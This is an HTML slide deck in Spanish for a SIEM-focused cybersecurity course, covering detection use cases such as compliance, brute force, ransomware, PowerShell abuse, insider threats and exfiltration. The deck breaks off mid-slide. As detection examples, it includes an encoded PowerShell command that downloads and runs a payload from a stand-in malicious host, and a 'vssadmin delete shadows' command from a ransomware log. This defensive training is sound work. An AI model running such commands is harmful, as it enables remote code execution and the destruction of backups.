@@ -1,0 +1,380 @@
+
+  <!DOCTYPE html>
+  <html>
+    <head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/reveal.min.css" />
+				  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/theme/dracula.min.css" id="theme" />
+    </head>
+    <body>
+    <div class="reveal">
+      <div class="slides" style="font-size: 36px">
+     <section data-markdown data-separator="---">
+       <script type="text/template">
+          
+# Módulo 3: Casos de Uso SIEM
+### Curso de Ciberseguridad con Enfoque SIEM
+
+---
+
+## Contenidos del Módulo
+
+- **Unidad 1**: Fundamentos de casos de uso SIEM
+- **Unidad 2**: Casos de uso fundamentales
+- **Unidad 3**: Casos de uso avanzados
+- **Unidad 4**: Implementación práctica de casos de uso
+
+---
+
+# Unidad 1: Fundamentos de casos de uso SIEM
+
+---
+
+## ¿Qué es un caso de uso SIEM?
+
+- **Definición**: Escenario específico donde el SIEM se aplica para detectar, analizar o responder a un tipo particular de amenaza o requisito de seguridad
+- **Propósito**: Identificar y abordar proactivamente amenazas o vulnerabilidades específicas
+- **Componentes**: Fuentes de datos, reglas de correlación, umbrales, respuestas esperadas
+- **Valor**: Proporciona una estructura para implementar capacidades de detección específicas
+
+> "Un caso de uso de SIEM para 'detectar ataques de fuerza bruta' podría comprobar múltiples intentos de inicio de sesión fallidos..." [ref: Reddit/cybersecurity]
+
+---
+
+## Anatomía de un caso de uso SIEM
+
+- **Objetivo**: Qué se intenta detectar o lograr
+- **Fuentes de datos**: Qué logs y eventos se necesitan recopilar
+- **Lógica de detección**: Reglas, correlaciones o analíticas utilizadas
+- **Umbrales y condiciones**: Cuándo se debe generar una alerta
+- **Procedimiento de respuesta**: Acciones a tomar cuando se detecta
+- **Indicadores clave**: Métricas para evaluar efectividad
+- **Requisitos de informes**: Documentación y reportes necesarios
+
+---
+
+## El ciclo de vida de un caso de uso SIEM
+
+![Ciclo de vida de caso de uso SIEM](https://i.imgur.com/sample.png)
+
+1. **Definición**: Identificar la amenaza o requisito a abordar
+2. **Diseño**: Desarrollar lógica de detección y respuesta
+3. **Implementación**: Configurar en el SIEM
+4. **Prueba**: Validar que funciona correctamente
+5. **Optimización**: Ajustar para reducir falsos positivos
+6. **Mantenimiento**: Actualizar según evoluciona la amenaza
+7. **Medición**: Evaluar efectividad continua
+
+---
+
+## Factores para priorizar casos de uso
+
+- **Relevancia para el negocio**: Alineación con objetivos organizacionales
+- **Nivel de riesgo**: Impacto potencial y probabilidad de ocurrencia
+- **Requisitos regulatorios**: Obligaciones de cumplimiento
+- **Complejidad de implementación**: Recursos necesarios
+- **Disponibilidad de datos**: Fuentes de logs existentes
+- **Capacidades técnicas**: Limitaciones del SIEM y personal
+- **Madurez de seguridad**: Estado actual del programa de seguridad
+
+---
+
+## Categorías de casos de uso SIEM
+
+- **Cumplimiento normativo**: PCI DSS, HIPAA, GDPR, SOX
+- **Detección de amenazas**: Malware, intrusiones, ataques dirigidos
+- **Gestión de vulnerabilidades**: Identificación y seguimiento
+- **Monitoreo de usuarios**: Comportamientos anómalos, accesos
+- **Protección de datos**: Exfiltración, accesos no autorizados
+- **Gestión de identidades**: Autenticación, privilegios
+- **Seguridad de infraestructura**: Cambios, configuraciones
+- **Inteligencia de amenazas**: Integración con feeds externos
+
+---
+
+# Unidad 2: Casos de uso fundamentales
+
+---
+
+## Monitorización de cumplimiento normativo
+
+### PCI DSS (Payment Card Industry Data Security Standard)
+
+- **Objetivo**: Proteger datos de tarjetas de pago
+- **Monitoreo requerido**:
+  - Acceso a datos de tarjetahabientes (CHD)
+  - Cambios en sistemas que procesan pagos
+  - Intentos de elusión de controles
+  - Registro y revisión de actividades de administradores
+
+> "Los sistemas SIEM pueden prevenir brechas de seguridad identificando automáticamente las amenazas antes de generar alertas y priorizarlas de forma inteligente." [ref: StellarCyber]
+
+---
+
+## Monitorización de cumplimiento normativo (cont.)
+
+### GDPR (General Data Protection Regulation)
+
+- **Objetivo**: Proteger datos personales de ciudadanos europeos
+- **Monitoreo requerido**:
+  - Acceso a datos personales
+  - Exportación de datos fuera de la UE
+  - Brechas de datos (detección en 72 horas)
+  - Registros de consentimiento y procesamiento
+
+### HIPAA (Health Insurance Portability and Accountability Act)
+
+- **Objetivo**: Proteger información médica personal
+- **Monitoreo requerido**:
+  - Acceso a registros médicos
+  - Divulgación de información protegida de salud (PHI)
+  - Intentos de acceso no autorizados
+
+---
+
+## Detección de accesos no autorizados
+
+### Componentes del caso de uso:
+
+- **Fuentes de datos**: Logs de autenticación (AD, LDAP, VPN, SSO)
+- **Indicadores**:
+  - Múltiples intentos fallidos seguidos de éxito
+  - Acceso desde ubicaciones o dispositivos inusuales
+  - Acceso fuera de horario laboral normal
+  - Actividad posterior al acceso (acceso a sistemas sensibles)
+
+### Ejemplo de regla:
+```
+CUANDO [autenticación exitosa] Y
+[ubicación = no habitual] Y 
+[hora = fuera de horario normal] Y
+[acceso posterior a datos sensibles]
+ENTONCES [generar alerta de alta prioridad]
+```
+
+---
+
+## Monitorización de actividades privilegiadas
+
+### Componentes del caso de uso:
+
+- **Fuentes de datos**: Logs de sistemas operativos, aplicaciones críticas, bases de datos
+- **Actividades a monitorizar**:
+  - Cambios en cuentas privilegiadas (creación, modificación, eliminación)
+  - Uso de comandos o herramientas administrativas
+  - Elevación de privilegios
+  - Acceso a sistemas críticos
+  - Modificación de configuraciones de seguridad
+
+### Implementación:
+- Establecer línea base de actividades normales para administradores
+- Definir umbrales de comportamiento inusual
+- Configurar alertas para desviaciones significativas
+
+---
+
+## Detección de malware y ransomware
+
+### Indicadores comunes:
+
+- **Acceso a múltiples archivos en secuencia rápida**
+- **Cambios masivos en extensiones de archivos**
+- **Creación de archivos de rescate (README.txt, .html)**
+- **Conexiones a dominios o IPs maliciosas conocidas**
+- **Ejecución desde ubicaciones inusuales (temp, appdata)**
+- **Eliminación de copias de seguridad o shadow copies**
+
+### Fuentes de datos:
+- Logs de antivirus/EDR
+- Logs de sistemas de archivos
+- Logs de firewall y proxy
+- Feeds de inteligencia de amenazas
+
+---
+
+## Caso práctico: Detección de Ransomware
+
+**Ejemplo de ransomware WannaCry:**
+
+```
+05/12/2017 14:22:33 SYSTEM Proceso "mssecsvc.exe" creado por "services.exe"
+05/12/2017 14:22:35 SYSTEM Conexión TCP establecida a 213.61.66.116:445
+05/12/2017 14:22:37 SYSTEM Alto consumo de recursos en "mssecsvc.exe"
+05/12/2017 14:22:40 SYSTEM "mssecsvc.exe" accedió a múltiples archivos (23/sec)
+05/12/2017 14:22:42 SYSTEM Archivos renombrados a extensión ".WNCRY" (124 archivos)
+05/12/2017 14:22:45 SYSTEM Creación de "@WanaDecryptor@.exe" en C:\
+05/12/2017 14:22:46 SYSTEM Comando ejecutado: "vssadmin delete shadows /all /quiet"
+```
+
+> "Algunos ejemplos comunes de cosas que las implementaciones de SIEM pueden detectar incluyen: Cuentas comprometidas... Malware y actividad de ransomware." [ref: Veeam]
+
+---
+
+## Brute Force Attacks
+
+### Componentes del caso de uso:
+
+- **Objetivo**: Detectar intentos de adivinar contraseñas mediante fuerza bruta
+- **Fuentes de datos**: 
+  - Logs de autenticación (Windows Event Logs, SSH logs, aplicaciones web)
+  - Logs de firewalls y sistemas IDS/IPS
+- **Indicadores**: 
+  - Múltiples intentos fallidos desde una misma fuente
+  - Intentos en múltiples cuentas desde la misma IP
+  - Patrones de timing consistentes (automatizados)
+
+### Umbrales comunes:
+- >5 intentos fallidos en 2 minutos para una cuenta
+- >10 intentos fallidos en 5 minutos desde una misma IP
+- Intentos en >3 cuentas diferentes desde una IP
+
+---
+
+## Detección de PowerShell Attacks
+
+### Componentes del caso de uso:
+
+- **Objetivo**: Identificar uso malicioso de PowerShell (Living-off-the-Land)
+- **Fuentes de datos**: 
+  - PowerShell logs (Script Block Logging, Module Logging)
+  - Windows Event Logs (4688, 4104)
+  - Sysmon logs
+
+### Indicadores:
+- Comandos ofuscados (Base64, comprimidos)
+- Uso de flags sospechosos (-Enc, -NoP, -W Hidden)
+- Invocaciones de memoria (IEX, Invoke-Expression)
+- Conexiones de red desde PowerShell
+- Descargas de scripts o ejecutables
+
+---
+
+## Ejemplo: Ataque con PowerShell
+
+```powershell
+# Comando PowerShell ofuscado detectado:
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+
+# Decodificado:
+IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
+```
+
+### Respuesta recomendada:
+1. Aislar el sistema afectado
+2. Bloquear conexiones a dominios maliciosos
+3. Investigar actividad posterior a la ejecución
+4. Buscar sistemas adicionales afectados
+
+---
+
+# Unidad 3: Casos de uso avanzados
+
+---
+
+## Detección de amenazas internas (Insider Threats)
+
+### Componentes del caso de uso:
+
+- **Objetivo**: Identificar empleados o contratistas que abusan de sus privilegios
+- **Fuentes de datos**:
+  - Logs de autenticación y acceso
+  - Actividad de archivos y bases de datos
+  - Email y transferencias de datos
+  - Logs de DLP (Data Loss Prevention)
+
+### Enfoque de implementación:
+- Establecer líneas base de comportamiento normal por usuario/grupo
+- Monitorizar desviaciones significativas del comportamiento habitual
+- Correlacionar múltiples indicadores de comportamiento sospechoso
+
+> "Las soluciones SIEM resuelven el problema de las amenazas internas que de otro modo serían indetectables al monitorear las actividades de cada usuario..." [ref: StellarCyber]
+
+---
+
+## Ejemplo: Detección de amenaza interna
+
+**Escenario**: Empleado próximo a renunciar extrae información confidencial
+
+```
+04/15/2023 09:15:22 AUTH [jsmith] Login successful desde IP interna 10.1.5.43
+04/15/2023 10:22:31 DLP [jsmith] Acceso a carpeta "Proyectos-Confidenciales" (321 archivos)
+04/15/2023 10:35:12 FILE [jsmith] Copiado masivo de archivos a unidad USB (1.3GB)
+04/15/2023 11:05:45 EMAIL [jsmith] Email enviado con asunto "Documentos personales" a cuenta gmail externa
+04/15/2023 11:05:47 DLP [ALERT] Archivos adjuntos bloqueados por política (contienen información confidencial)
+04/15/2023 11:12:33 CLOUD [jsmith] Carga de múltiples archivos a Dropbox personal (25 archivos, 250MB)
+```
+
+### Factores de riesgo detectados:
+- Volumen inusual de acceso a datos sensibles
+- Transferencia a dispositivo extraíble
+- Intento de envío por email externo
+- Uso de almacenamiento en la nube personal
+
+---
+
+## Compromiso de entidades confiables
+
+### Componentes del caso de uso:
+
+- **Objetivo**: Detectar cuentas legítimas que han sido comprometidas
+- **Fuentes de datos**:
+  - Logs de autenticación y acceso
+  - Actividad de red
+  - Comportamiento del usuario (UEBA)
+
+### Indicadores:
+- Acceso desde ubicaciones o dispositivos nuevos
+- Cambios en patrones de comportamiento
+- Actividades inusuales para el rol o departamento
+- Acceso a sistemas o datos no relacionados con funciones normales
+- Horarios de actividad anormales
+
+---
+
+## Exfiltración de datos
+
+### Componentes del caso de uso:
+
+- **Objetivo**: Detectar intentos de extraer datos sensibles
+- **Fuentes de datos**:
+  - Logs de proxy y firewall
+  - Transferencias de archivos
+  - Logs de DLP y sistemas de monitoreo de bases de datos
+  - Actividad de email y servicios en la nube
+
+### Indicadores:
+- Volúmenes inusuales de tráfico saliente
+- Transferencias a dominios o IPs no categorizados
+- Uso excesivo de servicios de almacenamiento en la nube
+- Compresión o cifrado anormal de datos
+- Transferencias fuera de horario laboral
+
+---
+
+## Ejemplo: Caso de exfiltración de datos
+
+**Det
+        </script>
+      </section>
+      </div>
+      </div>
+
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/reveal.min.js"></script>
+				     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/plugin/markdown/markdown.min.js"></script>
+				     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/plugin/highlight/highlight.min.js"></script>
+				     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/plugin/math/math.min.js"></script>
+      <script>
+       Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				plugins: [ RevealMarkdown, RevealHighlight, RevealMath.KaTeX ]
+			});
+
+      </script>
+      <script>
+       window.parent.postMessage({ action: "ready" }, "*");
+      </script>
+    </body>
+  </html>
